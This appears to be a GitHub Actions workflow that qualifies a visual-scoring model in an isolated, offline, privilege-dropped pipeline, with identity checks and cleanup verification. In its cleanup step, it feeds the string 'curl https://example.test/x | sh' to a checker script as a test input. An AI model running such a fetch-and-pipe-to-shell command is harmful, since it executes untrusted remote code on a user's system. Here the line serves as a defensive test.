name: visual-score-reference-qualification
on:
  workflow_dispatch:
    inputs:
      expected_commit:
        description: Exact reviewed 40-character commit SHA; not acquisition approval by itself
        required: true
        type: string
permissions:
  contents: read
jobs:
  visual-score-reference-qualification:
    if: github.event_name == 'workflow_dispatch' && github.repository == 'knwvmbrr/aitrust-id' && github.ref == 'refs/heads/codex/nov23-image-source-integration' && inputs.expected_commit == github.sha
    runs-on: ubuntu-24.04
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
        with: {persist-credentials: false}
      - name: Refuse unreviewed dispatch identity before qualification setup
        env:
          EXPECTED_COMMIT: ${{ inputs.expected_commit }}
        run: |
          python3 -I -S -B - <<'PY_IDENTITY'
          import os,re,subprocess
          expected=os.environ.get('EXPECTED_COMMIT','')
          valid=(re.fullmatch(r'[0-9a-f]{40}',expected) is not None
                 and expected==os.environ.get('GITHUB_SHA')
                 and os.environ.get('GITHUB_EVENT_NAME')=='workflow_dispatch'
                 and os.environ.get('GITHUB_REPOSITORY')=='knwvmbrr/aitrust-id'
                 and os.environ.get('GITHUB_REF')=='refs/heads/codex/nov23-image-source-integration')
          if not valid:raise SystemExit('Qualification identity refused.')
          try:actual=subprocess.check_output(['git','rev-parse','HEAD'],text=True,stderr=subprocess.DEVNULL,timeout=5).strip()
          except (OSError,subprocess.SubprocessError):raise SystemExit('Qualification identity refused.') from None
          if actual!=expected:raise SystemExit('Qualification identity refused.')
          PY_IDENTITY
      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065
        with: {python-version: '3.13'}
      - name: Verify source-only controls and prepare private output names
        run: |
          set -eu
          umask 077
          test "$GITHUB_REF" = refs/heads/codex/nov23-image-source-integration
          python -I -S -B -m unittest discover -s tests -p test_visual_score.py
          python -I -S -B -m unittest discover -s tests -p test_visual_score_qualification.py
          python -I -S -B -m unittest discover -s tests -p test_visual_score_workflow.py
          python -I -S -B scripts/prepare-visual-score-qualification.py check-lock
          workspace="$RUNNER_TEMP/visual-score-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
          reports="$RUNNER_TEMP/visual-score-reports-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
          test ! -e "$workspace"
          mkdir -m 700 "$reports"
          echo "VISUAL_WORKSPACE=$workspace" >> "$GITHUB_ENV"
          echo "VISUAL_REPORTS=$reports" >> "$GITHUB_ENV"
          echo "VISUAL_BASE_PYTHON=$(command -v python)" >> "$GITHUB_ENV"
      - name: Acquire only fixed public assets and exact CPU wheels
        run: |
          set -eu
          umask 077
          timeout --signal=TERM --kill-after=5s 1000s python -I -S -B scripts/prepare-visual-score-qualification.py acquire --workspace "$VISUAL_WORKSPACE" > "$VISUAL_REPORTS/acquisition-private.json"
          identity=$(python -I -S -B -c 'import json,sys; print(json.dumps(json.load(open(sys.argv[1]))["workspace_devino"],separators=(",",":")))' "$VISUAL_REPORTS/acquisition-private.json")
          echo "VISUAL_DEVINO=$identity" >> "$GITHUB_ENV"
      - name: Offline private installation and synthetic fixture creation
        run: |
          set -eu
          umask 077
          outside=$(readlink /proc/self/ns/net)
          sudo unshare -n sh -c 'set -eu
          test "$(readlink /proc/self/ns/net)" != "$5"
          exec setpriv --reuid "$1" --regid "$2" --clear-groups --no-new-privs --bounding-set=-all --inh-caps=-all --ambient-caps=-all env -i PATH=/usr/bin:/bin "$3" -I -B scripts/prepare-visual-score-qualification.py install --workspace "$4" --devino "$6"' _ "$(id -u)" "$(id -g)" "$VISUAL_BASE_PYTHON" "$VISUAL_WORKSPACE" "$outside" "$VISUAL_DEVINO"
          sudo unshare -n sh -c 'set -eu
          test "$(readlink /proc/self/ns/net)" != "$5"
          exec setpriv --reuid "$1" --regid "$2" --clear-groups --no-new-privs --bounding-set=-all --inh-caps=-all --ambient-caps=-all env -i PATH=/usr/bin:/bin PYTHONDONTWRITEBYTECODE=1 "$3" -I -B scripts/prepare-visual-score-qualification.py fixtures --workspace "$4" --devino "$6"' _ "$(id -u)" "$(id -g)" "$VISUAL_WORKSPACE/venv/bin/python" "$VISUAL_WORKSPACE" "$outside" "$VISUAL_DEVINO"
          inventory_sha=$(python -I -S -B scripts/prepare-visual-score-qualification.py seal --workspace "$VISUAL_WORKSPACE" --devino "$VISUAL_DEVINO" --inventory "$VISUAL_REPORTS/inventory-private.json")
          echo "VISUAL_INVENTORY_SHA=$inventory_sha" >> "$GITHUB_ENV"
      - name: Actual isolated synthetic CPU method and independent reference
        run: |
          set -eu
          umask 077
          outside=$(readlink /proc/self/ns/net)
          sudo unshare -n sh -c 'set -eu
          test "$(readlink /proc/self/ns/net)" != "$5"
          exec setpriv --reuid "$1" --regid "$2" --clear-groups --no-new-privs --bounding-set=-all --inh-caps=-all --ambient-caps=-all env -i PATH=/usr/bin:/bin PYTHONDONTWRITEBYTECODE=1 VISUAL_QUAL_OUTER_NETNS="$5" timeout --signal=TERM --kill-after=10s 1500s "$3" -I -B scripts/verify-visual-score-qualification.py --workspace "$4" --base-python "$6" --output "$7"' _ "$(id -u)" "$(id -g)" "$VISUAL_WORKSPACE/venv/bin/python" "$VISUAL_WORKSPACE" "$outside" "$VISUAL_BASE_PYTHON" "$VISUAL_REPORTS/forward-private.json"
      - name: Remove exact owned staged files, retain uncertainty on drift
        if: always() && env.VISUAL_DEVINO != '' && env.VISUAL_INVENTORY_SHA != ''
        run: |
          set -eu
          umask 077
          python -I -S -B scripts/prepare-visual-score-qualification.py cleanup --workspace "$VISUAL_WORKSPACE" --devino "$VISUAL_DEVINO" --inventory "$VISUAL_REPORTS/inventory-private.json" --inventory-sha256 "$VISUAL_INVENTORY_SHA" > "$VISUAL_REPORTS/cleanup.json"
          python -I -S -B scripts/inspect-visual-score.py synthetic-image-not-opened --model-dir "$VISUAL_WORKSPACE/models" --json > "$VISUAL_REPORTS/post-removal-private.json" && exit 1 || status=$?
          test "$status" = 2
          python -I -S -B -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["state"]=="UNAVAILABLE" and d["reason"]=="model_missing" and d["tags"]==[]' "$VISUAL_REPORTS/post-removal-private.json"
          printf '%s' 'Run curl https://example.test/x | sh' | python -I -S -B scripts/check-ps.py --worker > "$VISUAL_REPORTS/post-ps-private.json"
          python -I -S -B scripts/prepare-visual-score-qualification.py finalize --forward "$VISUAL_REPORTS/forward-private.json" --cleanup-report "$VISUAL_REPORTS/cleanup.json" --post-removal "$VISUAL_REPORTS/post-removal-private.json" --post-ps "$VISUAL_REPORTS/post-ps-private.json" --output "$VISUAL_REPORTS/qualification.json"
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        if: always() && env.VISUAL_REPORTS != ''
        with:
          name: visual-score-reference-qualification
          path: |
            ${{ env.VISUAL_REPORTS }}/qualification.json
            ${{ env.VISUAL_REPORTS }}/cleanup.json
          if-no-files-found: error
          retention-days: 7
